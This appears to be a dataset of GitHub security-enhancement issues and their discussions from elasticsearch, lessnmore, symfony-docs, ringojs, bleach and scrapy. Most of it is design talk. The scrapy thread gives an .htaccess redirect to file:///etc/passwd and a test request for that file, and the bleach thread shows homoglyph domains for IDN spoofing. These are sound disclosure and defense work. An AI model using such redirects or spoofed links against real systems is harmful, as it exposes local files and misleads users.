I don't have a strong view, but my leaning is towards @bytebilly's point of view here.

Since we currently silently disable roles with DLS/FLS if the license does not permit them, it seems consistent to also ignore them when creating API Keys. Effectively, the user does not have that role at the time they create the API Key.

I don't think it's particularly surprising, other features like watcher jobs will also silently ignore that role (although the different is that for watcher the role will automatically turn back on if the license is upgraded and for API Keys that would not be the case).
 @bytebilly I listed a couple reasons in the issue description for why I prefer throwing error instead of silently ignore user roles with DLS/FLS. I can expand a bit more on my reasonings.

I question whether this is a really meaningful use case to support. When you authenticate as `user`, any roles with DLS/FLS are indeed sliently ignored. But that's more justifiable because if we throw errors for it, it means users cannot authenticate at all. Since every request requires authentication, this means users are completely locked out from the system and this feels too intrusive. Is ""not able to create API keys"" a similar intrusive experience? I'd like to think no. API key creation by end users is probably not something that needs to happen all the time? The more frequent and larger volume usages are mostly required by system services like fleet which does not have concern of DLS/FLS. One possible impact is Kibana alerting which requires granting API keys to end users. But is it a widespread use case for users with DLS/FLS to create alerts and does that have to keep working before an admin can fix either the license or the role? License expiration or downgrade is pretty significant event. Presumably, an admin need to take prompt actions to fix things. The removal of grace period of license expiry means that we are confident that cluster admins should now be made aware of license issues more easily. Hence it seems to make sense that we don't need additional leniency for individual features.

On technical side, it is not feasible to check API key's role descriptors after its creation. So it is not straightforward to tell whether a key is created by silently ignoring offending user roles or not. If somehow alerts are created with API keys that do not have sufficient privileges and do not actually work (not sure if UI can completely prevent it from happening), it could end up being more confusing for users. Another more techinical note is that alerting API keys are (mostly?) created without explicitly specifying the role descriptors. That is, it implicilty take all users roles as key roles. If we are to disallow keys roles to have DLS/FLS. Should we also disallow this situation?

That said, if the team collectively prefers the more relaxed approach (i.e. ignoring users roles), I am happy to take that direction as well. At implementation level, all options we considered so far are pretty similar.

",no,">enhancement,:Security/License,Team:Security,"
elastic/elasticsearch,420935167,"Unicode normalization for passwords","_Backstory: I was reading this fine [blog post](https://withblue.ink/2019/03/11/why-you-need-to-normalize-unicode-strings.html) about unicode normalization._

The gist of the matter is that Unicode defines a code point for some characters é (U+0039) but also, to facilitate introduction from the myriad of input devices, defines ""combo""s of characters, eg e (U+0065)  adjoined by  ́ (U+0301) which would be displayed identical.

There is this [RFC3454](https://tools.ietf.org/html/rfc3454) which describes this at length.

Because we only allow ASCII characters for usernames and role names, we are immune to impersonation/phishing attacks discussed [here](http://www.unicode.org/reports/tr36/) .

But we allow **Unicode for passwords**, and we should be doing normalization before hashing for the Native and File Realm. This would be narrowing the vocabulary a bit (collapsing multiple characters onto a single ""normalized"" variant) but would improve the user experience.","Pinging @elastic/es-security",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,463758639,"Support for nested groups in LDAP authentication realm","<!-- Feature request -->

Currently Elasticsearch does not support searching nested groups in LDAP, but it does with AD ([see docs](https://www.elastic.co/guide/en/elastic-stack-overview/current/security-limitations.html)).  Would it be possible to enable nested groups for the LDAP authentication realm as well?
","Pinging @elastic/es-securityThe information in the docs is heavily summarised, and the reality is slightly more nuanced that the docs imply. We may want to update the doc to try and reflect reality a little more closely.

**TL;DR**
Our LDAP realm supports nested groups _if-and-only-if_ the directory resolves them transparently. Active Directory does resolve nested groups, and it is my understanding that [Red Hat Directory Server / 389DS does as well](https://access.redhat.com/documentation/en-us/red_hat_directory_server/10/html/administration_guide/advanced_entry_management#groups-cmd-memberof). OpenLDAP does not. Other commercial LDAP directories might.

**Technical Details**
In any user store where there is a concept of Users and Groups, you have two options about how to model & store that relationship:
1. Groups contain a list of their members.
2. Members (typically Users) hold a list of the groups to which they belong.

Standard LDAP schemas implement the former option. For example the [`GroupOfNames`](https://ldapwiki.com/wiki/GroupOfNames) ObjectClass contains a `member` attribute which holds the `DN` for each object that is a member of that group. That `DN` could refer to a `User` or another `GroupOfNames`.

This has some advantages:
- Only those object classes that specifically deal with _membership_ (i.e. Groups) need to know the details of how membership is handled. From an encapsulation point of view this is preferable, compared with scattering membership information into all object classes that can potentially be a member of a group.
- It is optimized for answering questions in the form of ""who is a member of this group?"", which (see point below) is often a very close proxy for ""who has access to this _data/file/server/etc_?"".
- For access control models that are built directly on top of groups - e.g ""Users in the `ServerAdmin` group may log on to this server"" - it is quite efficient at answering those questions at runtime (you expand ths `ServerAdmin` group to get its members, and then see whether the current user is in that list).

However, it is not a good fit for the type of model Elasticsearch Security uses where groups are essentially just metadata about users. When a user authenticates to Elasticsearch using LDAP, we resolve their metadata, including their group membership, and turn that into a list of roles.  
We are never interested in the question ""Who is a member of `MI6`?"", we always want to ask ""To which groups does `James.Bond` belong?

Thankfully many LDAP directory have support for tracking the inverted relationship from _User_ to _Group_ via `memberOf` functionality. Active Directory and Red Hat/389 DS do this by default. OpenLDAP requires the optional _MemberOfOverlay_.

You can see the difference between these two between these two possible LDAP models in the [configuration options for the LDAP realm](https://www.elastic.co/guide/en/elasticsearch/reference/7.2/security-settings.html#ref-ldap-settings).
- The `user_group_attribute` setting is used to configure the name of the `memberOf` attribute, in which case we simply ask the directory server to return the user's group membership when we retrieve the rest of their data. 
- For directories without `memberOf` support, we need to use the `group_search.*` settings, which tell us how to search the directory for any groups that list the user as a member.

When you're doing the top-down group resolution that LDAP schemas are typically designed around, nested group expansion is a little cumbersome, but manageable. The approach is roughly:  
**_To find all the (nested) members of group `CN=Elasticsearch Admins, OU=groups, DC=example, DC=com`_**
1. Access the `CN=Elasticsearch Admins, OU=groups, DC=example, DC=com` entry, and retrieve the `member` attribute.
2. Access the entries for each of those ""members"" (it is usually possible to get all of them in a single request), and retrieve the `dn`, `cn`, `objectClass` and `member` attributes.
3. For any entries where the `objectClass` is a _User_, add the DN/CN to the list of ""users-who-belong-to-this-group"".
4. For any entries where the `objectClass` is a group, add their _members_ to the list of ""members-to-retrieve"" and go to step 2.
5. If there were no groups in step 4, you're finished.

However, working from the bottom-up approach (using group_search) is horribly inefficient.   
**_To find all the (nested) groups to which `CN=Keyser Söze, OU=users DC=example, DC=com` belongs_**
1. Search the directory for any groups that list `CN=Keyser Söze, OU=users DC=example, DC=com` as a member.
2. Add the `DN` of each result to the ""group-membership"" set.
3. For each `DN` that was _new_ in step 2 (that is, not already in the set), go to step 1. It is sometimes possible to search for several groups at once, but it is not usually possible to do them all in one request.

Logically, that is quite easy, but the search in step 1 (find entries with these attributes) is _slow_ when compared with the _get-entry-by-DN_ lookup that is used in the top-down approach.

We have chosen not implement that behaviour because it can lead to very slow authentication processing and holds on to pooled LDAP connections and internal ES locks while it does that.
It is possible that we _might_ chose to do implement this in the future, but our estimation is that given the performance profile of that sort of implementation, it would not actually be very useful in the real world.

We would be more willing to do nested `memberOf` support because that has a performance profile more like the top-down approach.   
However, for Acitve Directory and Red Hat/389 DS we don't need to, because both of those directories automatically do it for us. When we ask which groups a user belongs to, they expand nested groups for us (technically the keep the inverted references up to date whenever a group is modified, rather than building them when we search so it is faster).
The only directory that I know of that has `memberOf` support but does not automatically expand nested-groups is OpenLDAP.

**Net Result**
1. If you are using Active Directory, then use our `active_directory` realm. It will automatically handle nested groups, as well as a bunch of other AD specific things.
2. If you are using RedHat DS or 389DS, then you should already have nested group support using `user_group_attribute` / `memberOf`. If that isn't working correctly, then please let us know because we can probably fix it.
3. If you are using OpenLDAP with the memberOf overlay (or any other LDAP directory that supports `user_group_attribute` / `memberOf`, but doesn't automatically expand nested groups) and want support for nested groups, please tell us, because we can probably build it (but even better - tell your directory vendor that they should automatically expand nested groups in their `memberOf` attribute)
4. If you are using a directory that requires group resolution using `group_search` (and not `user_group_attribute`) then we are unlikely to support nested groups, because it is not technically possible for us to implement it in an efficient manner.
Hello @tvernum - **TLDR:** How do I make nested groups work in Elastic, with a 389 LDAP server? 

Removed original post, and moved it here, to save space: https://pastebin.com/raw/3HU9sZc9Hi @maltewhiite, this issue is about discussing generic support for nested groups in Elasticsearch ldap authentication realm. Would you mind opening a topic with your user question in our [forums](https://discuss.elastic.co/c/elastic-stack/81) ? Someone will try and assist you there.  Thanks!EDIT: I got it to work in my local vagrant setup. You're welcome to delete my two comments if you want this thread to be clean. 

I used the following documentation: 
- https://www.elastic.co/guide/en/elasticsearch/reference/7.0/security-settings.html#ref-ldap-settings
- https://www.elastic.co/guide/en/elasticsearch/reference/7.0/configuring-ldap-realm.html
- https://www.elastic.co/guide/en/elasticsearch/reference/7.0/ldap-realm.html
- https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-clear-cache.html - Used for testing. So I can set IDM groups, clear cache, and immediately test, without having to wait for the server to update its cache.

If group_search.base_dn isn't set, then it enables user_group_attribute and user_search.scope. 
user_group_attribute has default memberOf and user_search.scope has default sub_tree. sub_tree searches all objects contained under base_dn.

Basically all I ended up doing to make it work, was _removing_ this following line from the /etc/elasticsearch/elasticsearch.yml file, and then restarting the service: 
`xpack.security.authc.realms.ldap.dap389.group_search.base_dn: cn=groups,cn=accounts,dc=sanitized`

This wasn't easy to figure out for me. Spent 16 hours to figure this out. I basically knew nothing about LDAP and Elastic before this, though. ",no,":Security/Authentication,Team:Security,"
alanhogan/lessnmore,258361858,"Allow configuration to require HTTPS login","LM 2.4.0 allowed HTTPS-only cookies but you can still log in on HTTP if your server is flexible, which many would be given http:// short URLs.

We should allow forcing HTTPS logins","Planned implementation: 

1. Introduce a new constant, something like `REQUIRE_HTTPS_TO_SHRINK_OR_MANAGE`
2. Any API or web UI requests — that is, anything that hits `/-/index.php` today — would fail with a `400 BAD REQUEST` error and an error page or error message (depending on whether it is via web UI or API) stating that HTTPS is required.

This would be preferred over a 301 or other redirection because a redirection does not let the user know that they have potentially leaked their API key in plaintext, etc.

Of course, the downside is that old integrations & bookmarks will break. This should be combatted with appropriate warnings on the upgrade.",no,"Enhancement,Security,"
alanhogan/lessnmore,272620677,"Add new config to separate issues of short URL protocol and shortening protocol","Meaning HTTP vs HTTPS. Personally I think it makes a huge amount of sense to serve short URLs on HTTP (or HTTPS) but to refuse to shorten URLs unless over HTTPS. Currently LM has no mechanism to enforce such a policy. 

See also #50 ",,no,"Enhancement,Security,"
alanhogan/lessnmore,258207580,"MD5 is dead, man","This project is pretty old now and MD5 is weak as heck. We should replace it with a more modern hash.",,no,"Enhancement,Security,"
alanhogan/lessnmore,272619916,"Bookmarklet should be updated to shorten via HTTPS",,,no,"Enhancement,Security,"
alanhogan/lessnmore,261141819,"Migrate to DB-powered authentication","- [ ] Migration that adds a users table
- [ ] Support for admin users and add-only users
- [ ] API keys reimplemented and tied to users (probably one-to-many)
- [ ] UI to create, delete, and privelege users & create & delete API keys
- [ ] UI to change your password
- [ ] Authentication would no longer be via config file, instead via db + bcrypt

this would require a major version bump
this would solve #33 and #34","Users could be marked as needing a password change",no,"Enhancement,Security,Migration,"
alanhogan/lessnmore,258207609,"Don't require plaintext passwords in config","it isn't the craziest thing in the world… but it isn't great either. let's do better",,no,"Enhancement,Security,"
symfony/symfony-docs,1178769833,"[Security doc] UserRepository need to implement PasswordUpgraderInterface","In the Security documentation (https://symfony.com/doc/current/security.html#the-user for the 6.0 version), when using the `console make:user`command as written (and continuing by using the form_login or a custom authenticator) the authenticaion works perfectly.
BUT in case you want to integrate with an existing User/Admin/Person/... entity, there is one element missing in the documentation to make it work : the Repository linked to that entity MUST implement the `PasswordUpgraderInterface`.

This is due to the dispatch of a `CheckPassportEvent` here : https://github.com/symfony/security-http/blob/53d572f06fc438faae3713cc97d186d941919748/Authentication/AuthenticatorManager.php#L183-L184

which triggers the following listener: `CheckCredentialsListener` which adds a `PasswordUpgradeBadge` automatically (here : https://github.com/symfony/security-http/blob/53d572f06fc438faae3713cc97d186d941919748/EventListener/CheckCredentialsListener.php#L95-L97)

That badge afterwards is then used at the dispatch of the `LoginSuccessEvent` by the `PasswordMigratingListener` to upgrade the password of the user with the provided user during the login request. Without that implementation by the Repository, the update is not made but the password is reset to blank and that generates a fail in the authentication afterwards...

In the current, doc, an example of the User entity implementing the proper interfaces is provided but there is no information about the repository implements need. Maybe a note could be put under the User entity code to inform about that specific need on the Repository?",,no,"Security,"
symfony/symfony-docs,1039753013,"[Security] Prevent `FormLoginAuthenticator` from responding to requests…","| Q            | A
| ------------ | ---
| Feature PR   | symfony/symfony#41993
| PR author(s) | @abunch
| Merged in    | 5.4",,no,"Security,"
symfony/symfony-docs,1311463732,"[Security] Add a method in the security helper to ease programmatic log…","| Q            | A
| ------------ | ---
| Feature PR   | symfony/symfony#41406
| PR author(s) | @johnkrovitch, @chalasr
| Merged in    | 6.2",,no,"Security,"
symfony/symfony-docs,1021176179,"[META] Symfony Security issues","In #15503 we're revamping Security docs. This meta-issue lists all security-related issues that are still pending. That way we can quickly check them and see if we've already fixed them in the new docs or even if we can ignore them because they are not relevant for docs:

* [x] (5.4) #15733
* [x] (5.4) #15721
* [x] (5.4) #15719
* [x] (5.4) #15625
* [x] (5.4) #15622
* [x] (5.4) #15598
* [ ] (5.3) #15357
* [x] (5.3) #15251
* [x] (5.3) #15230
* [ ] (5.3) #15203
* [x] (5.3) #15065
* [x] (5.3) #15059
* [ ] (5.3) #15574
* [ ] (5.3) #15886
* [x] (5.2) #15133
* [x] (5.2) #14634
* [x] (5.2) #14628
* [x] (5.2) #14117
* [x] (5.2) #14704
* [ ] (3.4) #12243
* [ ] (3.4) #4258","Thanks Javier! I've checked some tasks that I believe don't need any documentation change (too implementation detail or just internal change).",no,"Security,"
symfony/symfony-docs,1334411942,"[Security] [Login Link] Give some security-related infos: link length, used algorithm, etc.","Some questions which I think should be answered on https://symfony.com/doc/current/security/login_link.html#invalidate-login-links

1. What is the length of the generated link (""signed URL"")? Is this configurable?
2. Which signing algorithm is used? Is this configurable? Does it use some salt?
3. Show an example of such a URL",,no,"Security,"
symfony/symfony-docs,1315943904,"[RateLimiter][Security] Improve performance of login/request rate limit…","| Q            | A
| ------------ | ---
| Feature PR   | symfony/symfony#46110
| PR author(s) | @Seldaek, @wouterj
| Merged in    | 6.2",,no,"Security,RateLimiter,"
symfony/symfony-docs,1040088759,"[SecurityBundle] Deprecate not configuring explicitly a provider for cu…","| Q            | A
| ------------ | ---
| Feature PR   | symfony/symfony#43835
| PR author(s) | @lyrixx
| Merged in    | 5.4","We have some `custom_authenticators` occurrences in docs ... but I'm not sure if we have to change something. I don't fully understand the changes at https://github.com/symfony/symfony/pull/43835@javiereguiluz There is a new deprecation when one have two or more user provider **and** a custom_authenticator **and** does not specify the user provider to use.

the following configuration will emit a deprecation:

```yaml
security:
    enable_authenticator_manager: true

    providers:
        app_user_provider_email:
            entity:
                class: App\Entity\User
                property: email
        app_user_provider_token:
            entity:
                class: App\Entity\User
                property: token
    firewalls:
        dev:
            pattern: ^/(_(profiler|wdt)|css|images|js)/
            security: false
        main:
            lazy: true
            custom_authenticator: App\Security\TokenAuthenticator
```

and the following one is OK:

```yaml
security:
    enable_authenticator_manager: true

    providers:
        app_user_provider_email:
            entity:
                class: App\Entity\User
                property: email
        app_user_provider_token:
            entity:
                class: App\Entity\User
                property: token
    firewalls:
        dev:
            pattern: ^/(_(profiler|wdt)|css|images|js)/
            security: false
        main:
            lazy: true
            provider: app_user_provider_token
            custom_authenticator: App\Security\TokenAuthenticator
```
",no,"hasPR,help wanted,SecurityBundle,"
symfony/symfony-docs,1244301987,"[Security] Access Tokens","Documentation page related to the PR https://github.com/symfony/symfony/pull/46428","Hey!

Oh no, it looks like you have made this PR towards a branch that is not maintained anymore. :/
Could you update the [PR base branch](https://docs.github.com/en/free-pro-team@latest/github/collaborating-with-issues-and-pull-requests/changing-the-base-branch-of-a-pull-request) to target one of these branches instead? 4.4, 5.4, 6.0, 6.1.

Cheers!

Carsonbot",yes,"Security,Status: Needs Review,"
symfony/symfony-docs,1392388493,"[Security] Add caution on symfony cli web server exposing env vars on private network","Hi,

One can understood that this web server is a great tool for development purposes but this addition should be added imho for knowledge :)

Context:

when checking some local data accessible on local network with coworker
we arrived to display a symfony cli served app profiler (obviously it is in `dev` env)
and in the profiler > request/response panel > server parameters > regular env vars => **thus exposing also symfony unrelated env vars which are included**

friendly ping @wuchen90 ^^","I'm divided about adding this. I thought it was clear that this CLI + local server is only for the `dev` environment ... so it should never be used in production or any other real servers.

But, let's wait to read more opinions. Thanks.@javiereguiluz 

> so it should never be used in production

we are not using it in prod at all, but in development locally but as it run a web server, one can find it on local private network and see unrelated env vars",yes,"Security,Status: Needs Review,Waiting feedback,"
ringo/ringojs,1232890778,"Announce 3.x EOL after Jetty's End of Community Support","Jetty 9.x will be End of Community Support and more or less EOL starting this June. We should ship RingoJS 4.0.0 before this date. See: https://github.com/eclipse/jetty.project/issues/7958","It's now August 20 so we are pretty much running an EOL version? I just downloaded 3.0.0 :face_exhaling: You can expect the release in the next days after I get final feedback from ORF ON people. Until then you can test the release candidate e.g. via the provided Docker images.> You can expect the release in the next days after I get final feedback from ORF ON people. Until then you can test the release candidate e.g. via the provided Docker images.

I have the impression that ringo is only maintained for backward compatibility purpose only, for the needs of the corporates invested in it and don't want to move to new technologies but not for new users. The evidence is no one cares about this repo, no one cares and answers submitted issues and there is no new features added. This is a dead project.If you have projects running on top of Ringo, feel free to join the development & new ideas. The overall progess is depending on the [underlying JavaScript engine Rhino](https://github.com/mozilla/rhino/). Since the whole core team is working for @orfon, it is no surprise that the main focus of the project is aligned with them.Btw. We will release 4.0.0 together with the switch of the RingoJS.org server. This will also replace old Google Groups and IRC logs and you can start discussions and questions in our project's [Github Discussions](https://github.com/ringo/ringojs/discussions/463).",no,"java,security,"
mozilla/bleach,474181380,"`.linkify` vulnerable to punycode attacks","This was originally filed to the [security bug tracker](https://bugzilla.mozilla.org/show_bug.cgi?id=1566541) but it was decided this is not within the security threat model of the library.

---

Steps to reproduce:

I decided to start work on a PR for the Bleach issue concerning localized domains (https://github.com/mozilla/bleach/issues/368). When building test-cases, I decided to generate one for ""punycode attacks"" aka [IDN Homograph Attack](https://en.wikipedia.org/wiki/IDN_homograph_attack) when unicode lookalike/homoglyph characters are replaced in a link text.

This allows a malicious attacker to create a link to a lookalike domain name.

For example:

    googĺe.com	xn--googe-95a.com
    wikipediа.org wikipedi\u0430.org

    print linkify(""http://googĺe.com"")
    print linkify(""http://wikipediа.org"")

Modern browsers defend against this somewhat by customizing what appears in the display bar once it is clicked; however they do not control (to my knowledge) what happens on the page.

Actual results:

    print linkify(""foo http://googĺe.com bar"")
    foo <a href=""http://googĺe.com"" rel=""nofollow"">http://googĺe.com</a> bar

    print linkify(""foo http://wikipediа.org bar"")
    foo <a href=""http://wikipediа.org"" rel=""nofollow"">http://wikipediа.org</a> bar

Expected results:

Since bleach is a security focused library, I think it should - be default - approach this situation how the strictest of modern browsers do, but allow for other use cases as this approach is very much tailored to ""English users"" and not the international community. I think a Boolean argument to linkify could be used to provide security by default, and allow non-english alphabet users the ability to opt-out.

Default: the HREF should be be the punycode version

    <a href=""http://xn--googe-95a.com"" rel=""nofollow"">http://googĺe.com</a>

Optional Strict: Linkified Text is also punycode

    <a href=""http://xn--googe-95a.com"" rel=""nofollow"">http://xn--googe-95a.com</a>

Optional Loose: allow the text as-is and leave everything to the browser

     <a href=""http://googĺe.com"" rel=""nofollow"">http://googĺe.com</a>

This functionality could also be implemented in a callback function, which would accept as input two arguments: the raw link and the context ('a' href value, 'a' node/display text,  bare html to be turned into an a tag).

Handling this via a callback is IMHO the best option as it would allow for bleach to abandon the regex of locked-down TLDs that seems to create more issues than it solves, while allowing users to still lock them down if wanted.","I don't think this is something I'm going to work on and I'm inclined to close it out as out-of-scope.

Has anyone looked into whether this could be done as a standalone filter that runs after the linkify filter? Then it could cover links from the original HTML after a clean pass as well as links created with linkify.",no,"security,linkify,"
mozilla/bleach,196516751,"verify sanitizated output for regression tests","In pull #241, I added regression tests for `bleach.clean`. We should verify the output for those regression tests.","Tagging @g-k with this one.👍 I'm planning to pull in the test page from https://cure53.de/purify and modify it to POST to a test server that calls `bleach.clean` and plugs the result back into the DOM.

Hopefully we can reuse their karma test runner to easily check against browsers too: https://github.com/cure53/DOMPurify/blob/master/test/karma.conf.js",no,"security,clean,needs-your-help,"
scrapy/scrapy,111587865,"scraping https via proxy: remove custom proxy headers after tunnel connection","When using a proxy service for crawling an https site, the Proxy-authorization header gets removed after the initial HTTP CONNECT method to prevent it being forwarded to the target site in https://github.com/scrapy/scrapy/blob/master/scrapy/core/downloader/handlers/http11.py line 206:

```
if isinstance(agent, self._TunnelingAgent):
            headers.removeHeader('Proxy-Authorization')
```

Some proxy-services (eg. proxymesh.com) allow custom headers to be set (proxymesh: http://proxymesh.com/blog/pages/proxy-server-headers.html#request). If these headers will not be removed after the HTTP CONNECT they will be sent encrypted and the proxy service cannot remove them anymore and they are forwarded to the target site. To prevent these headers from being forwarded to the target site, it would be nice to have an option to remove these as well, similar to the Proxy-Authorization header. 

I am not sure what the best way would be, but maybe via request.meta (eg. 'dont_forward_headers_list')? Any suggestions? 
","+1 I have met the same issue. Does anybody could help us out this issue? I though it would be the general problem with scrapy by using the proxy to scrapy the https sites.

And also, If someone would like to inject some custom headers into https request. It would need to refactor the `download/handler/http11.py` implementation.
",no,"enhancement,security,"
scrapy/scrapy,36568660,"scrapy may keep wrong proxy setting when following redirects","When:
- `http_proxy` is set for `HttpProxyMiddleware`,
- and an `http://` request is redirected to an `https://` location, 

scrapy will use the `http_proxy` settings for the `https` scheme.

This also happens for `https://` to `http://` 

`Proxy-Authorization` header is also propagated.

To test:
- `http://www.facebook.com` redirects to `https://www.facebook.com`
- `https://instagram.com/` redirects to `http://instagram.com`

Note: interesting discussion on HTTP redirection and headers: https://code.google.com/p/go/issues/detail?id=4800
","A possible solution is to cleanup all proxy related metakeys and headers on `process_response()` hook of HttpProxyMiddleware
I think using something like `scrapy.utils.datatypes.MergeDict` for the headers could help. We want headers added at spider level to be kept, but the rest to be removed.
`Redirect` and `Retry` middlewares returns a `Request` on `process_response` which send the request to the beginning of the `DownloaderMiddleware"" chain, so the headers added on that instance are going to be added again if they are needed.

But what about redirections to different domains with an `Authorization` header. Should we have a `meta` key with the headers to keep?
",no,"bug,help wanted,security,"
scrapy/scrapy,22264692,"Security enhancement when following a ""redirect""","I believe this is not a bug, but could fit in as a security enhancement.

**TL;DR** When following HTTP redirects, scrapy should only follow http/https requests. Quite possibly similar to (CVE-2009-0037) http://curl.haxx.se/docs/adv_20090303.html

Scenario:
a. A spider that simply stores raw or minimally sanitised data.
b. By default scrapy follows HTTP redirects.
c. The values of both DOWNLOAD_HANDLERS and DOWNLOAD_HANDLERS_BASE are set to their default.

``` python
DOWNLOAD_HANDLERS = {}
DOWNLOAD_HANDLERS_BASE = {
    'file': 'scrapy.core.downloader.handlers.file.FileDownloadHandler',
    'http': 'scrapy.core.downloader.handlers.http.HTTPDownloadHandler',
    'https': 'scrapy.core.downloader.handlers.http.HTTPDownloadHandler',
    's3': 'scrapy.core.downloader.handlers.s3.S3DownloadHandler',
    'ftp': 'scrapy.core.downloader.handlers.ftp.FTPDownloadHandler',
}
```

And let's say a malicious client might issue a redirect such as

```
# ==== .htaccess ====
RewriteEngine On
Redirect 301 /trap.html  file:///etc/passwd
# ==== ENDof .htaccess ====
```

And so, my spider will be ""leaking"" my own _""/etc/passwd""_ file because Scrapy followed the 301 redirect from _""http:// ... /trap.html""_ to _""file:///etc/passwd""_.

Shouldn't scrapy enforce some sort of protocol restriction so that it only follows the http/https protocols when following redirects? 
","The explanation makes sense, but what about pages containing links to `file:///etc/passwd` directly on their HTML?
I think that by default _file://_ should not be scraped nor indexed, but since access to local files might be useful when writing tests and contracts a new setting key could be introduced to scrapy's core. That key/value setting would define whether the scraping of _file://_ is allowed or not. 
Therefore, leaving it up to the developer writing spiders to override that default value and allow at hers/his own risk the scraping and indexing of _file://_ .

And regarding the initial point, I believe that ""redirects"" should never follow _file://_ .
Is there any situation where a remote `file:///` link is useful for scraping?
@barraponto I don't believe _file://_ is ever of any use, except when testing local files and there's no http server running. I also believe that those use cases are so rare, and have easy natural alternatives, therefore having file:// enabled by default is a security risk.
That's what I think as well. But I'd like to hear what @pablohoffman or @dangra have to say about it.
@mvsantos: I understand the issue but must say Scrapy defaults are set to ease development, and tuned in production in a per case basis. 

As a general rule It's recommended to run spiders in constrained environments, limited in memory, CPU and filesystem access, and this environments makes access to local files a derisory issue.

Disabling `file://` by default will become a common gotcha for local development. 
What about adding a ""Recommendation for running spiders in production"" page to docs? 
@dangra I understand and appreciate your point about Scrapy's approach to ease development.
Your suggestion of a ""must read"" page sounds good.

I understand that Scrapy's maintainers want to make it as easy as possible for newcomers. 
And, we (scrapy users) are expected to do our homework when it comes to our enviroment's security.
But features that pose possible security risks and are not required by the system's core, should be enabled if required, not by default. 
So, in my opinion leaving `file://` enabled by default, is far from a _derisory_ issue that you claim. Please note that I don't want to sound like a scaremonger, but right now Scrapy's is leaving inexperienced users at risk of possible privilege escalation‎ attacks.
Just gave a re-read to the whole issue. I think the initial proposal of disallowing http redirections to non-http urls makes sense.

Even if `file://` urls are allowed by default Scrapy settings, links extracted from HTML pages won't work because of  `OffsiteMiddleware` (enabled by default too).

`file://` requests are created on purpose when using `scrapy shell` or sometimes from `start_urls` and that will continue to work for developers.
@dangra Do you mean they _shouldn't_ work from HTML pages because of `OffsiteMiddleware`? Or is that the current behavior?
That is the current behavior when `allowed_domains` spider attribute is set (default spider templates does)

I admit this is not the strong security-by-default you are expecting but It minimizes this issue for newbies again.

@kmike, @redapple, @nramirezuy  what do you think? 
Following `file://` links on `http[s]://` pages looks wrong. Following them on `file://` pages or having them in `start_urls` looks fine.

Also, I don't quite get the scope of this issue: how will attacker get the contents of `/etc/passwd` even if spider downloaded it? Is it assumed that spider has a code that submits downloaded response back to attacker's server (maybe via FormRequest or something like that), or there are other scenarios when downloading `file://` files is bad?
Ah, I've read the CVE and it is clearer now, please disregard my question.

What about adding `allowed_protocols` argument to Request constructor? It'll be without `file` by default, but the default `start_requests` implementation will create Requests with `file` included in allowed protocols. This way `start_urls` will work. 
Protocol checking should be done outside Request constructor because unsupported link shouldn't cause an exception in response handler.
@kmike Any service that scrapes content and outputs near-raw data could be targeted by an attacker. Examples, but not limited to:
- Services that generate image or pdf from a given URL, i.e. http://snapito.com/ ;
- Services that calculate a website SEO's score (not so common these day);
- Services that provide extensive search for third parties. SaaS that does website indexing and offers custom search competing with Google's Custom Search Engine);

Any of these services could be powered by Scrapy, and an attacker could exploit them by creating traps such as `<a href=""file:///etc/passwd"">foo</a>` so that once the service iterates a sitemap or downloads whatever page where that trap is deployed to, the target spits out the data scraped.

Just to clarify, the initial point I raised:
A. HTTP redirects and html meta refresh, should only work with http[s]. So far, looks like we all agree with this one.
B. Some kind of master switch could be introduced to the settings file, making it clear that allowing requests to `file://` may result in unwanted results if `OffsiteMiddleware` is not defined or disabled or open to any domains.
I wouldn't mind having a `DEBUG` or `TEST_MODE` setting in `settings.py` similar to Django's [`DEBUG`](https://docs.djangoproject.com/en/dev/ref/settings/#debug):
- that would enable `file://` if set to `True`, with a default value of `False`
- defined and set to `True` when `settings.py` is created with `scrapy startproject`,
- and printing a visible shouting warning log line stating to ""NEVER deploy a spider into production with DEBUG turned on"" (borrowed from Django's doc)

Additionally, could `file://` be authorized by default in only specific commands like `scrapy shell` or `scrapy parse`?
@redapple IMO this problem asks for a setting of its own, since there're security implications and therefore beyond the `DEBUG` scope.
@mvsantos my comment above suggested a name, but it could be more explicit indeed.
How do you feel about the 3 things this setting would do/authorize, whatever its name?
@redapple I personally don't like the idea of having security settings open by default, like you suggest in the second topic. But Scrapy's approach is clearly making as easy as possible to get the first ""HelloWorld"" spider working, then your 3 topics should work fine.

Also, @dangra idea of _adding a ""Recommendation for running spiders in production"" page to docs_ is great for newcomers like myself, to make sure we deploy Scrapy in a sane and secure fashion.
@dangra you are not protected by Offsite on redirects. But as @kmike said you need to send the file back to the server to be an issue.
@nramirezuy: OffsiteMW is not a great ""protection"", but to put my words to work, it won't let `file://` urls pass:

``` patch
diff --git a/scrapy/tests/test_spidermiddleware_offsite.py b/scrapy/tests/test_spidermiddleware_offsite.py
index f7523f7..2e58827 100644
--- a/scrapy/tests/test_spidermiddleware_offsite.py
+++ b/scrapy/tests/test_spidermiddleware_offsite.py
@@ -23,7 +23,8 @@ class TestOffsiteMiddleware(TestCase):
                        Request('http://sub.scrapy.org/1'),
                        Request('http://offsite.tld/letmepass', dont_filter=True)]
         offsite_reqs = [Request('http://scrapy2.org'),
-                       Request('http://offsite.tld/')]
+                        Request('http://offsite.tld/'),
+                        Request('file:///etc/passwd')]
         reqs = onsite_reqs + offsite_reqs

         out = list(self.mw.process_spider_output(res, reqs, self.spider))
```

test output:

```
$ trial scrapy/tests/test_spidermiddleware_offsite.py
scrapy.tests.test_spidermiddleware_offsite
  TestOffsiteMiddleware
    test_process_spider_output ...                                         [OK]
  TestOffsiteMiddleware2
    test_process_spider_output ...                                         [OK]
  TestOffsiteMiddleware3
    test_process_spider_output ...                                         [OK]

-------------------------------------------------------------------------------
Ran 3 tests in 0.057s

PASSED (successes=3)
```
@nramirezuy : OffisteMW doesn't apply to redirects, right, but I was mentioning it in the context of links extracted from html pages. The idea with redirects is to disallow others than `https?://`.
Hi folks, any updates regarding this issue?

EDIT: here's what might happen when follow redirect (from http:// to file://) is a default behavior
 http://blog.detectify.com/post/82370846588/how-we-got-read-access-on-googles-production-servers
I think that `file://` links are fine only when it is developer who wrote them. Most common case (if not the only) for that is `start_requests` (and `start_urls`). It is convenient to have `file://` support in `start_requests`, but IMHO they should be disabled everywhere else. 

I don't like solutions with some global switch (be it a setting or a middleware) for several reasons:

1) developer should not forget to make this switch - it is a security issue itself;
2) there are cases when OffsiteMiddleware should be off, and we shouldn't have a security issue in this case;
3) explicitly written `file://` could be useful even in production (e.g. a sitemap bundled with a spider).

